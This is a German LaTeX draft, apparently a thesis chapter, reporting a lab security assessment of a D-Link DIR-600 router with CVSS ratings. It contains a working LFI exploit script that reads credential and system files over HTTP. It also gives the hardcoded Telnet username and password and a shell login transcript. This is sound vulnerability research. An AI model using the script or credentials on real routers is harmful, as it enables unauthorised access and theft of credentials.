	Der Trusted Secure Boot bietet eine Erweiterung des Secure Boot. Jede Stufe des Boot Prozess prüft die nächste,
	also die Hardare den Bootloade, der Bootloader das Kernel und das kernel die Systemdienste.
	Ziel dabei ist es eine durchgängige kryptographische Vertrauenskette zu bilden.
	Zudem verfügt der Rooter über einen Rollback Schutz, welcher verhindet da die Firmware auf eine ältere,
	verwundbare version zurückgesetzt werden kann. Ohne diesen Schutz hätten Angreifer die Möglichkeit alte Firmware
	mit bekannten Schwachstellen zu installieren.
	Angriffe auf die Firmware stellen ein besonders Risiko dar, da sid unterhlab von firewall und Betriebssystem liegt 
	und für den benutzt oftmals unichtbar zu erkenen ist.
	%---Quelle(https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-193.pdf)---%

	\chapter{Tests D-Link DIR-600}
	\label{sec:Tests D-Link DIR-600}
	%-------------TEST die alle NICHT funktioniert haben---------------------%
	Ziel der Untersuchung war es, potenzielle Sicherheitslücken zu identifizieren und zu testen.
	Die Analyse wurde unter Kali Linux durchgeführt, wobei der Router sowohl über Ethernet als auch
	über das Wireless Lokal Area Networke (WLAN) verbunden war.
	Die IP Adresse des Gerätes (192.168.0.1) wurde mittels \texttt{ping} sowie \texttt{ip route}
	verifiziert.
	
	Grundtest:
	\begin{table}[h]
		\hypertarget{tabelle1}{}
		\begin{tabularx}{\columnwidth}{|X|X|X|}
			\hline
			Pingen des Routers & ping 192.168.0.1 & Router wurde erreicht \\
			\hline
			Zugriff auf die Admin Seite & Firefox (http://192.168.0.1) & Login Seite wurde geladen, aber Credentials schlugen fehl \\
			\hline
		\end{tabularx}
		\caption{Testtabelle}
	\end{table}

	Es wurden verschiedene Zugangsdaten getestet, jedoch ohne Erfolg. nach einem Factory Reset
	durch Gedrückthalten der Reset-Taste für etwa 15 Sekunden wurden die Zugangsdaten auf die
	Werkseinstellungen zurückgesetzt. Anschließend war ein Login mit dem Standartbenutzter
	\texttt{admin} und einem leeren Passwort möglich.

	Die Bewertung der identifizierten Schwachstellen efolgt angeleht an das Common Vulnerability
	coring System (CVSS). Dabei werden insbesondere Angriffsvektor, Komplexität, benötigte Privilegien
	sowie die Auswirkung auf Vertraulichkeit, Integrität und Verfügbarkeit berücksichtigt.

	\section{Architektur des Routers}
	\label{sec:Architektur des Routers}
	Der betrachtete Router ist von der Firma D-Link und gehört zu der DIR-600 Reihe.
	Die Hardware Version ist Bx, das ist x steht für 1 oder 2 und er hat die Firmware 2.05 aus dem Jahr 2010.
	
	Der Router folgt einer klassischen Embedded-System-Architektur mit klar getrennten Schichten.
	Nach dem Start wird der Bootloader geladen. Er ist dafür zuständig die Hardware zu initialissieren, 
	und den Linux Kenerl aus dem Flash zu laden, welcher die Hardware abstrahiert.
	Der Linux Kernel übernimmt die Prozessverwaltung, den Netztwerstack und
	die Treibersteuerung. Das Root-Filesystem (SquashFS) auf das in chapter.. noch näher eingegangen wird, enthält
	eine minimalistische Userspace-Umgebung auf Basis von Busybox. 
	Das Konfigurationsdatenbanke (xmldb) ist das zentrale Element der Firmware, auf das mit dem Tool
	xmldbc zugegriffen wird. Dort werden die sämtliche Systemparameter gespeichert und über Skripte dynamisch in
	konkrete Systemkonfigurationen umgesetzt. Die Steuerung erfolgt über ein Webinterface, das mit PHP-Skripten
	mit der Konfigurationsschicht interagiert. Netzwerkdienste wie DHCP, NAT und WLAN werden durch eine
	Kombination aus Kernel-Modus und Userspace-Daemons realisisert.

	Der Router nutzt iptables für Routing und NAT, hostpad für WLAN und stellt einen integrierten Webserver
	mit HTTP und PHP zum Management bereit. Netzwerkdienste wie DHCP, DNS und PPP werden über spezialisierte Deamons und
	Skripte gesteuert.

	\section{Analyse des Netzwerkverkehrs}
	\label{sec:Analyse des Netzwerkverkehrs}

	\subsection{Werkeinstellungen}
	\label{sec:Werkeinstellungen}
	Vor beginn der Tests wurde der Router auf die Werkeinstellungen mithilfe des Reset-Knopfs zurückgesetzt.
	Der Router ist mit dem Laptop über ein LAN-Kabel mit Port 1 verbunden. Der Router ist mit dem Internet verbunden.
	Zum mittschnitt des Netzwerkverkehrs wurde das Tool Wiresharke verwendet.
	
	Mit dem Filter \texttt{dns} lassen sich lediglich die Pakete anzeigen die an den DNS Server geschickt werden.
	Der klassische DNS Server nutzt UDP (Port 53) und verschlüsselt seine Inhalte nicht.
	Die besuchten Domänen und Hintergrundinformationen sind voll Einsehbar.

	\begin{figure}[H]
		\centering
		\includegraphics[width=\textwidth]{img/http_login_dlink.png}
		\caption{Wireshark Filter: http}
		\label{fig:http}
	\end{figure}
	Der Router nutzt HTTP, das bedeutet die Packete werden unverschlüsselt übertragen.
	Beim Login auf die Admin Seite des Routers http://192.169.0.1 sind die Nutzer und Passwort
	im Klartext einsehbar. Auch das ändern des Passworts und das Einstellen anderer
	Konfigurationen konnte gemessen werden.
	Die Web-Oberfläche inlusive der UI, Statusseite und den konfigurationen wird über HTTP geladen.
	Ohne Transportverschlüsselung können Daten und Session-Inhalte passiv oder aktive durch eine Man-in-the-Middle Attacken
	mittgeschnitten oder manipuliert werden.

	\begin{figure}[H]
		\centering
		\includegraphics[width=\textwidth]{img/Passwort_telnet.png}
		\caption{Wireshark Filter: telnet}
		\label{fig:Telnet Passwort}
	\end{figure}
	Auch die Verbindung über das Telnet Protokoll wird unverschlüsselt übertragen.
	Die Login-Daten sind klar nachvollziehbar und können leicht rekonstruiert werden. 
	Telnet arbeitet Zeichenbasiert, daher wird jedes Zeichen als eigenes Paket oder Teil eines Streams geschickt.
	Sitzungen können volständig rekonstruiert werden.

	Das Adress Resolution Protokoll (ARP) ist ein Netzwerkprotokoll, welches zu einer Netzwerkadresse die 
	pysische Adresse ermittelt und diese Zuordnung in der ARP-Tabelle gegenbenenfalls hinterlegt.
	ARP ist ein Layer2 Protokoll und bietet keine Authentifizierung. Angriffe wie MAC-Spoofing oder 
	ARP-Spoofing sind möglich. 

	Dieselben Mittschnitte wurden über das WLAN ebenfalls untersucht, es wurden keine pregnanten unterschiede festgestellt.

	Die Anaylyse zeigt , das mehrere zentrale Dienste ohne kryptographische Absicherung betrieben werden. Dies macht
	Angriffe auf das Netztwerk möglich, wodurch Authentifizierungsdaten komprimitiert werden können.

	\subsection{Gehärteter Router}
	\label{sec:Gehärteter Router}
	***In Arbeit***

	\section{Firmware-Analyse}
	\label{sec:Firmware-Analyse}
	Zur Analyse der Firmware wurde das Tool \texttt{binwalk} eingesetzt:

	\begin{lstlisting}
	binwalk DIR600B_FW205b01.bin 
	
	DECIMAL       HEXADECIMAL     DESCRIPTION
	------------------------------------------------------------
	48            0x30           Unix path: /dev/mtdblock/2
	96            0x60           uImage header, header size: 64 bytes,
									image size: 879555 bytes,
									Data Address: 0x80000000,
									Entry Point: 0x802B7000,
									OS: Linux, CPU: MIPS,
									compression type: lzma
	160           0xA0           LZMA compressed data
	917600        0xE0060        Squashfs filesystem
	\end{lstlisting}
	
	Der uImage Header enhält unter anderem Informationen zur CPU (MSI), zur Ladeadresse im RAM sowie zum Einstiegspunkt
	des Kernels. Das verwendete Linux-System basiert auf einem Kerne der Version 2.6x, was auf ein
	veraltetes System hindeutet.

	\begin{table}[h]
		\centering
		\hypertarget{tabelle1}{}
			\begin{tabularx}{\columnwidth}{|X|X|}
			\hline
			header size: 64 bytes & beschreibt den Kernel \newline enthält CRCs, Entry Point \\
			\hline
			image size: 879555 bytes & Größe des Kernel-Images \\
			\hline
			Data Address: 0x80000000 & RAM-Adresse, wo Kernel geladen wird \\
			\hline
			Entry Point: 0x802B7000 & Startadresse der Kernel-Ausführung \\
			\hline
			OS: Linux, CPU: MIPS & Zielarchitektur MIPS \\
			\hline
			compression: lzma & Kernel ist komprimiert, spart Flash-Speicher \\
			\hline
			\end{tabularx}
		\caption{Inside The uImage}
	\end{table}
	
	In LZMA compressed data steht der eigentliche Kernel Code, komprimiert LZMA.
	dictionary size: 32MB bestimmt das Kompressionsfenster und ist typisch für Embedded Linux Kernel.
	uncompressed size ~ 2.9MB ist die reale Kernelgröße nach dem Entpacken.

	PackImg section delimiter tag Das ist ein marker für den Begin einer weiteren Firmware-Section. 

	SquashFS ist ein komprimiertes, nur lesbares Linux Dateisystem der version 3.0.
	Durch Ausführen von:
	\begin{lstlisting}
		binwalk -e DIR600B_FW205b01.bin 
	\end{lstlisting}
	wurde die Förmwear extrahiert und das Dateisystem zugänglich gemacht.
	
	\subsection{LFI-Schwachstelle}
	\label{sec:LFI-Schwachstelle}

	In squashfs-root/www/ liegt die implementierung des Webinterface, verteilt auf eine Vielzahl von Ordner. 
	squashfs-root/www/model/\_\_show\_info.php, ist besonders relevant.
	Die Datei ist ein generischer Content-Renderer für das Webinterface. 
	Sie kann zum einen Standartanzeigen machen und
	Dynamische Includes machen. 
	Sie enthält folgenden Code:
	\begin{lstlisting}
		if($REQUIRE_FILE!="")
		{
			require($LOCALE_PATH."/".$REQUIRE_FILE);
		}
	\end{lstlisting}

	Hierbei wird der Parameter \texttt{REQUIRE_FILE} ohne Validierung in einen Dateipfand eingebunden
	und anschließend mittels \texttt{require()} eingebunden. Da dieser parameter direkt durch den
	Nutzer kontrolliert werden kann, entsteht eine Local File Inclusion (LFI)-Schwachstelle.
	Durch das verwenden von Directory Traversal Sequenzen, also der unautorisierte Zugriff auf Dateien 
	mittels Pfadangaben in der Url, können unteranderem sensible Daten eingesehen werden.
	Beispielsweise folgende anfrage: \texttt{/www/locale/en\_US/ + ../../../../var/etc/httpasswd}.
	PHP löst das dann zu /var/etc/httpasswd auf, die Datei wird eingebunden und der Inhalt auf der Webseite sichtbar.
	\begin{figure}[H]
		\centering
		\includegraphics[width=\textwidth]{img/Passwort.png}
		\caption{Seite nach Exploit}
		\label{fig: Hallo}
	\end{figure}
	Die Datei /var/etc/httpasswd ennthält für den aktuellen Benutztername und das Passowrt,
	welche wiederum oft nur schwach gehasht oder wie in diesem Fall im Klartext in der Datei gespeichert wird.
	Dies ermöglicht die Umgehung der Authentifizierung.

	Ein automatisisertes Testskript wurde verwendet um verschiedene Dateisysteme abzurufen.
	\begin{lstlisting}
	#!/bin/bash

	if [ $# -ne 1 ]; then
		echo " Error: No IP-Adress"
		exit
	fi

	IP_ADR=$1

	FILES=(
		"/var/etc/httpasswd"
		"/var/log/messages"
		"/proc/self/cmdline"
		"/proc/self/environ"
		"/proc/mounts"
		"/proc/version"
		"/proc/cpuinfo"
		"/etc/hosts"
	)

	test_file() {
	echo "------------------------------------"
	echo "Test: $1"
	echo "------------------------------------"
	local encode
	encode=$(printf "%s" "$1" | jq -sRr @uri)

	curl -s "http://${IP_ADR}/model/__show_info.php?REQUIRE_FILE=${encode}" \
		-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
		-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
		-H 'Accept-Language: en-US,en;q=0.5' \
		-H 'Accept-Encoding: gzip, deflate' \
		-H 'Connection: keep-alive' \
		-H 'Upgrade-Insecure-Requests: 1' \
		-H 'Priority: u=0, i' \
	| sed -e 's/<!--.*-->//g' \
			-e 's/<[^>]*>//g' \
			-e 's/&nbsp;//g' \
			-e '/^\s*$/d'
	}

	for file in "${FILES[@]}"; do
	test_file "$file"
	done

	exit
	\end{lstlisting}
	Das Skript arbeitet die einzelnen Pfade nacheinander ab. Der Befehl curl überträgt Daten zwischen dem Rechner
	und einem Server. Mit -H lassen sich HTTP-Header setzten. Zudem wurde das Paket jp installiert, so kann die Eingabe automatisch
	entsprechend der URL-Vorgaben formatiert werden.

	
	\begin{itemize}
	\item \texttt{/var/etc/httpasswd} – enthält Zugangsdaten für das Webinterface
	\item \texttt{/var/log/messages} – enthält Logdaten und Netzwerkaktivität
	\item \texttt{/proc/self/cmdline} – enthält informationen zur CommandLine des Prozesses
	\item \texttt{/proc/self/environ} – zeigt Mountpoints und die Filesystem-Struktur
	\item \texttt{/proc/mounts} – zeigt Umgebungsvariablen des Prozesses
	\item \texttt{/proc/version} – liefert Kernel-Informationen
	\item \texttt{/proc/cpuinfo} – enthält Informationen zur Hardwarearchitektur
	\item \texttt{/etc/hosts} – enthält den Hostnamen und die interne Struktur
	\end{itemize}

	\subsection{Bewertung:}
	\label{sec:lfi}

	\begin{itemize}
		\item \textbf{Attack Vector (AV):} Network
		\item \textbf{Attack Complexity (AC):} Low
		\item \textbf{Privileges Required (PR):} None
		\item \textbf{User Interaction (UI):} None
	\end{itemize}

	\textbf{Auswirkungen:}
	\begin{itemize}
		\item \textbf{Confidentiality (C):} High
		\item \textbf{Integrity (I):} Low
		\item \textbf{Availability (A):} Low
	\end{itemize}

	\textbf{Voraussetzungen:}  
	Zugriff auf das Webinterface des Routers (LAN/WLAN).

	\textbf{Gesamtbewertung:}  
	High, durch das extrahieren der Credentials sind weitere Angriffe auf den Router möglich.

	\textbf{Begründung:}  
	Die Schwachstelle erlaubt das Auslesen sensibler Systemdateien ohne
	Authentifizierung, was zu einem hohen Verlust an Vertraulichkeit führt.
	Die Ausnutzung ist trivial und erfordert keine besonderen Bedingungen.

	\subsection{Telnet}
	Teletype Networke (Telnet) ist ein Client/Server bassiertes Protokoll (Port 23), basierend auf einem zeichenbasierten austausch
	über eine TCP Verbindung. Bei Routern dient Telnet als Remote-Management-Protokoll
	und gibt dem Anwender eine Kommandozeile auf dem Gerät.
	Mit folgendem Befehl ist es möglich herauszufinden ob der Router eine Telnet Schnittstelle besitzt.
	\begin{lstlisting}
	nc -zv 192.168.0.1 23
	Connection to 192.168.0.1 23 port [tcp/telnet] succeeded!
	\end{lstlisting}
	Der D-Link DIR 600 besitzt eine Telnet-Schnittstelle, welche durch einen Nutzter und ein Passwort
	geschützt sind. Unter einem Embedded Linux ist der Standartnutzer in den meisten Fällen \texttt{Alphanetworks}.
	Dies lässt sich durch eine kurze Recherche über das Internet herausfinden. Das Standart Passwort des Routers unterscheidet sich
	nach Modell. Um das Passwort der Telnet-Schnittstelle harauszufinden, wurden die Firmware des Routers
	erneut analysiert.
	\texttt{grep -r "Alphanetworks"}
	\texttt{squashfs-root/etc/scripts/misc/telnetd\.sh: telnetd -l "/usr/sbin/login" -u Alphanetworks:\$image_sign -i \$lf &}
	Mit dem grep Befehel wurde die Firmware nach dem Standartnutzer rekrusiv durchsucht.
	Das Ergebniss zeigt den Nutzer und das Passowort, welches in \texttt{\$image_sign} gespeichert wird.
	\texttt{grep -r "image_sign" squashfs-root/}
	\texttt{squashfs-root/etc/scripts/misc/telnetd\.sh:image\_sign=`cat /etc/config/image_sign`}
	Die Ausgabe zeigt unter anderem diese Zeile, welche den Pfad zu dem Passwort enthält.
	\texttt{cat squashfs-root/etc/config/image\_sign}
	\texttt{wrgn23\_dlwbr\_dir600b}
	Der \texttt{cat-Befehl} liefert das Passwort.
	\begin{lstlisting}
	Trying 192.168.0.1...
	Connected to 192.168.0.1.
	Escape character is '^]'.
	login: Alphanetworks
	Password: wrgn23_dlwbr_dir600b
	\end{lstlisting}
	Die eingebaute Shell namens \texttt{Busybox} ist eine Custom-Shell die lediglich ein paar ausgewählte Linux-Befehle unterstützt.
	Der Befehl \texttt{mount} zeigt folgendes:
	\begin{lstlisting}
	/dev/root on / type squashfs (ro)
	none on /proc type proc (rw)
	sysfs on /sys type sysfs (rw)
	ramfs on /var type ramfs (rw)
	\end{lstlisting}
	Durch die Ausgabe wird deutlich, das es sich um eine Read-Only-Firmware mit einem Eingebetteten Linux Design handelt.
	Lediglich der RAM ist beschreibar, jedoch sind die Daten dort nur während der Laufzeit verfügbar und verschwinden nach einem Reboot.
	Dort werden typischerweise Logs, temporäre Dateien und Runtime-konfigurationen gespeichert.
	/proc enthält Prozess- und Systeminformationen und /sys Kernelparameter und die Hardwareabstarktion.
	Hier können Parameter gesetzt aber das System nicht persistent geändert werden.
	
	Der Nutzer und das Passwort für die Telnet-Verbidung sind hardkodiert und im System eingebettet. Sie können nicht geändert werden.
	Auch wenn auf dem System Daten nicht persistent geändert werden können, stellt die Telnet-Schnittstelle ein
	Risiko dar. Ein Angreifer könnte durch den befehl \texttt{reboot} eine sofortige Unterbrechung des Netztwerks
	auslösen. Da Schreibrechte auf dem /var Verzeichniss exsistieren könnten dort viele und große Dateien erzeugt werden, um so den 
	Speicher zu füllen und die Dienste zu destabalisieren. Dies könnte den Router erheblich verlangsamen oder zu einem 
	reboot führen. Außerdem kann der Angreifer durch Befehle wie ping, msh, kill oder busybox Prozesse mehrfach starten und die CPU dauerhaft belasten.
	Desweiteren können Routerkonfigurationen, die interne Netzstruktur, DNS und Gateway sowie die aktiven Clients
	eingesehen werden, was beim sammeln von Informationen erheblich helfen kann.

	\subsection{Bewertung:}
	\label{sec:Bewertung-Telnet}

	\begin{itemize}
		\item \textbf{Attack Vector (AV):} Network
		\item \textbf{Attack Complexity (AC):} Low
		\item \textbf{Privileges Required (PR):} Low
		\item \textbf{User Interaction (UI):} None
	\end{itemize}

	\textbf{Auswirkungen:}
	\begin{itemize}
		\item \textbf{Confidentiality (C):} High
		\item \textbf{Integrity (I):} High
		\item \textbf{Availability (A):} High
	\end{itemize}

	\textbf{Voraussetzungen:}  
	Zugriff über Telnet (LAN/WLAN), ermitteln des Passworts.

	\textbf{Gesamtbewertung:}  
	High, es sind weitere Angriffe über die Telnet-Verbidung möglich.

	\textbf{Begründung:}  
	Die Schwachstelle erlaubt den Zugriff auf eine Remote Shell.
	Sensible Daten könne ausgelsen werden und Befehle ausgeführt werden.
	Die Ausnutzung ist trivial und erfordert keine besonderen Bedingungen.

	\subsection{Analyse des DDNS-Systems}
	Die Analyse des DDNS-Subsystems dient dazu, potenzielle sicherheitskritische Datenflüsse zwischen
	Konfigurationsdatenbank, Skripten und Netzwerkkommunikation zu identifizieren.
	Im Fokus steht die rekonstruktion der Programmstruktur mittels Reverse Engineering %nochmal erklräen
	sowie eine anschließenden Bewertung.

	Die Firmware des D-Link DIR-600 Routers zeigt eine typische Architecktur für eingebettete Linux-Systeme.
	Konfigurationsdaaten werden über den Dienst \texttt{xmldbc} verwaltet, eine XML-Datenbank.
	Das Dynamic Domain Name System auch DDNS gennant, ist hier nicht als externe Bibliothek implementiert, sondern als seperates Binärprogramm.
	Die DDNS-Funktionalität wird über dynamisch generierte Shell-Skripte gestartet.
	\begin{lstlisting}
		# dyndns.sh
		rgdb -A $TROOT/misc/dyndns_run.php -V generate_start=$START > /var/run/dyndns.sh
		sh /var/run/dyndns.sh > /dev/console
	\end{lstlisting}
	Die eigentliche Logik wird dabei durch ein PHP-Template dynamisch, also während der Laufzeit erzeugt.
	Dieses Template entscheidet aufgrund von Konfigurationswerten aus der Router-Datenbank, ob und welcher DDNS-Client
	gestartet wird.
	
	Die eigentliche Befehlslogik wird dabei dynamisch erzeugt:
	\begin{lstlisting}
	if ($USER!="" && $PASS!="")
	{
		echo "echo Start dyndns #".$provider."... > /dev/console\n";
		echo "echo dyndns > ".$progfile."\n";
		echo "dyndns -S \"".$provider;
		echo "\" -u \"".$USER."\" -p \"".$PASS."\" -i ".$IPADDR." -t ".$TIME;
		echo " -o /var/run/dyndns.html -d \"".$vendor." ".$model."\"";
		echo " -q \"/var/run/dyndns.info\"";
		if ($HOST!="") { echo " -n \"".$HOST."\""; }
		echo " > /dev/console &\n";
	}
	\end{lstlisting}
	Hierbei wird zur Laufzeit ein Systembefehl generiert und ausgeführt.
	Auffällig ist, das sämtliche Parameter, einschließlich Benutzername, Passwort, Hostname und IP-Adresse,
	direkt aus der Konfigurationsdatenbank übernommen werden. Eine zusätzliche Validierung
	dieser Eingabe findet nicht statt. Dies stellt einen kritischen Punkt dar, da es sich dabei
	um potenziell manipulierte Daten handel könnte.

	Die Analyse des Binärprogramms \texttt{/usr/bin/dyndns} wurde mithilfe von Ghira genauer analysiert 
	Es zeigt das die Kommandozeilenargumente direkt verarbeitet werden:
	\begin{lstlisting}
	case 0x6e:  // -n
		pcRam1000027c = optarg;   // hostname
	case 0x70:  // -p
		DAT_10000288 = optarg;    // password
	case 0x69:  // -i
		DAT_10000280 = optarg;    // IP address
	case 0x53: // -S
		DAT_10000274 = atoi(optarg);  // provider ID
	\end{lstlisting}
	
	Anschließend wird anhand einer Service-ID entschieden, welcher DDNS-Anbieter
	verwendet wird. Hierfür wird eine intern Tabelle verwendet, welche Service-Namen numerische Identifikation zuordnet.
	Falls die Parameter ungültig oder unvollständig führt dies zum Programm abbruch.

	Nach der Konfigurationsphase folt die Netzwerklogik.
	Das Programm arbeitet mit zustandbasierter Logik über \texttt{select()}:
	\begin{lstlisting}
	iVar2 = select(uVar7 + 1,
			(fd_set *)local_288,
			(fd_set *)__writefds,
			(fd_set *)0x0,
			&local_290);
	\end{lstlisting}
	Interpretation der Zustände:
	0 = disconnected
	1 = connecting
	2 = connected/update running
	Abhängig vom aktuellen Zustand werden zyklisch Netzwerkverbindungen aufgebaut, geprüft oder erneuert. 
	Dabei werden klassische BSD-Socket-Funktioenen wie \texttt{socket()} und \texttt{connect()},
	um eine Verbindung zu den jeweiligen DDNS-Servern herzustellen.
	
	Die Auswahl des DDNS-Anbieter bestimmt dabei den Aufbau der HTTP-Anfrage. 
	Die Firmware unterstützt mehrere Anbieter(z.B. DynDNS, No-IP, usw), wobei jeder Anbieter ein spezifisches Anfrageformat verwendet. 
	Beispiel DynDNS.org
	\begin{lstlisting}
	snprintf(acStack_260,500,
		"GET /nic/update?&hostname=%s&ip=%s HTTP/1.0\r\n
			Authorization: Basic %s\r\n
			User-Agent: %s\r\n
			Host: %s\r\n\r\n",
			uRam1000027c,puVar2,uVar1,DAT_10000294,DAT_10000278);
	\end{lstlisting}
	Die HTTP-Requests werden manuell zusammengestezt und direkt über eine Socket-Verbindung versendet.
	Zusätzlich wird in den meisten Fällen eine Basis-Authentifizierung, bestehend aus Username und Passwort
	verlangt, welche Base64 Codiert in den HTTP-Header integriert werden (siehe oben).
	\texttt{base64encode(pcVar4,sVar3,&uStack_28);}

	Die Implementierung weist einige sicherheitskritischen Schwächen auf, die für ältere Embedded-Systeme typisch sind.
	Insbesondere der Verzicht auf eine verschlüsselte Kommunikation stellt ein potenzielles Risiko dar. 
	Sämtliche DDNS-Anfragen erfolgen über eine ungesicherte HTTP-Verbindung, wodurch Zugangsdaten im Klartext über das Netztwerk übertragen werden können.
	Dadurch besteht ein erhebliches Risiko für Man-in-the-Middle Attacken sowie das Anbgreifen von Zugangsdaten.

	Zudem werden sensible Daten im Speicher verarbeitet. Authentifizierunginformationen werden global abgelegt und mehrfach
	in unterschiedlichen Verarbeitungsschritten verwendet. Auch wenn keine direkten Schwachstellen im 
	untersuchten Codeabschnitt sichbar sind, bleibt durch die unsauberen Datenflüsse und die fehlende strikte Validierung ein erhötes Sicherheitsrisiko.

	\subsection{Bewertung:}
	\label{sec:Bewertung-DDNS}

	\begin{itemize}
		\item \textbf{Attack Vector (AV):} Network
		\item \textbf{Attack Complexity (AC):} Low
		\item \textbf{Privileges Required (PR):} None
		\item \textbf{User Interaction (UI):} None
	\end{itemize}

	\textbf{Auswirkungen:}
	\begin{itemize}
		\item \textbf{Confidentiality (C):} High
		\item \textbf{Integrity (I):} Low
		\item \textbf{Availability (A):} Low
	\end{itemize}

	\textbf{Voraussetzungen:}  
	Zugriff auf das Netzwerk (LAN).

	\textbf{Gesamtbewertung:}  
	High, es ist möglich den Netzwerkverkehr zu verfolgen (Man-in-the-Middle Attack)

	\textbf{Begründung:}  
	Die DDNS-Kommunikation erfolgt unverschlüsseltüber HTTP, wodurch Authentifizierungdaten
	im Klartext übertragen werden. Ein Angreifer kann diese durch einen Netztwerk-Mittschnitt
	abfangen und für weiter Angriffe verwenden.
	Dies ist mit geringem Aufwand möglich und erfordert keine besondere Voraussetzung.

	Die fehlende Validierung der Parameter stellt ein potenzielles Risiko dar, konnte im Rahmen
	der Analyse jedoch nicht zu einer konkreten Schwachstelle weitergeführt werden.

	% --------------ToDo--------------------%
	% Formatierung schön machen 
	% Bilder einfügen
	% Telnet voll fertig schreiben
	% WIRESHARK wichtig
	% Passwort testing auf der Webseite
	% Quellen korrekt einfügen auch im Text
	% --------------------------------------%

	%=======================notes jf - need to be deleted later
	%testen was passiert wenn Router auf Werkseinstellungen ist
	% -> kommt man dann einfach rein? ist wahrscheinlich sehr häufig der Fall
	% Bezugnahme Frauenhofer Router Test und das Paper "But is it exploitable?"
	% da dort auch beschrieben wird wie das "normale" user handhaben
	%=========================================================
	Was ich versucht habe bei Linksys WRT120N
	- Reset Button lange gedrückt
		einmal auch mit Anschluss ans LAN, aber LAN flackert nicht, d.h. keine
		Datenübertragung (LAN als auch Switch funktioniert, da es an Laptop
		läuft)
		LEDs flackern auch nicht beim Reset -> funktioniert es überhaupt?
	- Stromlos schalten versucht
		mit LAN Kabel eingesteck, leuchtet kurz auch das Internet zeichen 
		beim Boot aber geht gleich wieder aus
	- via Linux, als auch Windows auf die Konifguration zu kommen
	- beides mal reboot ausfgeführt -> keine Veränderung
	- firmware Update über Kali 
		.iso Setup Datei von Archive.org -> "file to big"
		.bin 1.0.05 Firmware -> in Progress, aber nach Beendung keine
		Änderung
	- firmware Update über Windows
		.iso Setup Datei von Archive.org -> "file to big"
		.bin 1.0.05 Firmware -> in Progress, aber nach Beendung keine
		Änderung
	- pingen:
		pingen funktioniert nur wenn der Router direkt an den Laptop
		angeschlossen ist
		pingen wenn beide im gleichen Netzwerk sind, funktioniert nicht
		egal ob über Internet oder normaler Port am Router

	am nächsten Tag nochmal versucht und es hat funktioniert, aber nur im 
	Edge oder Chromium Browser, nicht in Firefox mit Default Anmelde Daten

	Erfolglose Versuche:
	Folgende Schwachstellen wurden ebenfalls getestet, konnten aber nicht ausgenutzt werden:
	
	\chapter{Evaluierung}
	Aufgabe des Kapitels Evaluierung ist es, aufzuzeigen in wie weit die Ziele der
	Arbeit erreicht wurden. Es sollen also die erreichten Arbeitsergebnisse mit den
	Zielen verglichen werden. Ergebnis der Evaluierung kann auch sein, das bestimmte
	Ziele nicht erreicht werden konnten, wobei die Ursachen hierfür auch außerhalb
	des Verantwortungsbereichs des Autors liegen können.
	\newpage
	
	\chapter{Zusammenfassung und Ausblick}
	\section{Erreichte Ergebnisse}
	Die Zusammenfassung dient dazu, die wesentlichen Ergebnisse der Arbeit und vor
	allem die entwickelte Problemlösung und den erreichten Fortschritt darzustellen.
	(Sie haben Ihr Ziel er-reicht und dies nachgewiesen).
	\section{Ausblick}
	Im Ausblick werden Ideen für die Weiterentwicklung der erstellten Lösung
	aufgezeigt. Der Aus-blick sollte daher zeigen, dass die Ergebnisse der Arbeit
	nicht nur für die in der Arbeit identifi-zierten Problemstellungen verwendbar
	sind, sondern darüber hinaus erweitert sowie auf andere Probleme übertragen
	werden können.
	\subsection{Erweiterbarkeit der Ergebnisse}
	\subsection{Übertragbarkeit der Ergebnisse}
	\newpage
	
%	\chapter{Literaturverzeichnis}
%	\hypertarget{[1]}{[1]} \href{http://digbib.ubka.uni-karlsruhe.de/volltexte/91999}{R. Schmidt, “Aspektorientierte Komponentensysteme zur Unterstützung weitreichender Geschäftsprozesse,” 2000, S. 10; http://digbib.ubka.uni-karlsruhe.de/volltexte/91999.}
%%	{H. Zisler, “Computer-Netzwerke : Grundlagen, Funktionsweise, Anwendung” 2022, S. 93; https://ebookcentral.proquest.com/lib/hochschule-aalen/reader.action?docID=6383015&c=UERG&ppg=184.}
%	\section*{Anlage 1}
%	\addcontentsline{toc}{section}{Anlage 1}
%	\section*{Anlage 2}
%	\addcontentsline{toc}{section}{Anlage 2}
	
	
\end{document}
